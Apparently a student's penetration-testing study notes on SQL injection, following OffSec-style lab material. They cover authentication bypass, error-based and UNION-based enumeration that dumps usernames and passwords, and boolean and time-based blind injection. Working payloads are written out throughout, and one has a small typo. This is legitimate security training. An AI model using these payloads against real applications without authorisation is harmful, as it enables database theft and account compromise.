# SQLi


SQL vulnerabilities typically allow the attacker to extend the original application query to include database tables that would normally be inaccessible.

Subvert the intended application logic.


SQL enumeration


## Database Fingerprinting

When testing a web application, we sometimes lack prior knowledge of the underlying database system, so we should be prepared to interact with different SQL database variants.









## Identifying SQLi via Error-based Payloads

SQL injection can lead to authentication bypass, which is the first exploitation avenue we'll explore.


SQL injection is considered *in-band* when the vulnerable application provides the result of the query along with the application-returned value (SQL debugging enabled)

In-band: we're able to retrieve the database content of our query inside the web application.



Trailing the comments with two double slashes `//`. This provides visibility on our payload, and also adds some protection against any kind of whitespace truncation the web application might employ.

```
offsec' OR 1=1 -- //
```

To further expand on our attack, we could also take advantage of the error-based payload by enumerating the database directly.

```
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE r username = 'admin') -- //
```






## UNION-based Payloads
Concatenate two queries into one statement.

Whenever we're dealing with in-band SQL injections and the result of the query is displayed along with the application-returned value, we should also test for UNION-based SQL injections.


Two conditions:

1. The injected UNION query has to include the same number of columns as the original query.

2. The data types need to be compatible between each column.


Before crafting any attack strategy, we need to know the exact number of columns present in the target table.

To discover the correct number of columns, we can submit the following injected query, increasing the column value by one each time:

```
' ORDER BY 1-- //
```


Example (5 columns):
```
%' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT null, null, database(), user(), @@version -- //
```




Let's extend our tradecraft and verify whether a other tables are present in the current database.
We can start by enumerating the information schema of the current database from the `information_schema.columns` table.

Retrieve the columns table from the `information_schema` database belonging to the current database:

```
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```


Let's say we discovered a new table named users that contains four columns, including one named password. We craft a new query to dump the users table:

```
' UNION SELECT null, username, password, description, null FROM users -- //
```















## Blind SQL Injections

Opposed to in-band, blind SQL injections describe scenarios in which database responses are not directly returned, and behavior is inferred using either boolean- or time-based logic.


- Boolean-based blind SQL injections cause the application to return different and predictable values whenever the database query returns a TRUE or FALSE result. The output used to infer results comes from the web application, not the database itself.


```
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```
Since 1=1 will always be TRUE, the application will return the values only if the user is present in the database.
Using this syntax, we could enumerate the entire database for other usernames or even extend our SQL query to verify data in other tables.




- Time-based blind SQL injections infer the query results by instructing the database to wait for a specified amount of time. Based on the response time, the attacker is able to conclude if the statement is TRUE or FALSE.


```
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```

The IF condition will always be true inside the statement itself, but will return false if the user is non-existent.
























































































